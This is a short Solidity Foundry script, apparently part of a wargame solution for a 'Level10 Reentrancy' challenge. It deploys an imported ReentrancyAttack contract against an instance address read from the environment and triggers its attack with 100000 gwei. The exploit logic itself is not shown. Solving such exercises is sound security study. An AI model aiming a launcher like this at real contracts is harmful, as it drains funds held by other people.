// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {ReentrancyAttack} from "../src/attacks/Level10Reentrancy_Attack.sol";

contract ReentrancyScript is Script {
    function setUp() public {}

    function run() public {
        address instanceAddress = vm.envAddress("INSTANCE_ADDRESS");

        vm.startBroadcast();

        ReentrancyAttack attacker = new ReentrancyAttack(instanceAddress);
        attacker.attack{value: 100000 gwei}();

        vm.stopBroadcast();
    }
}
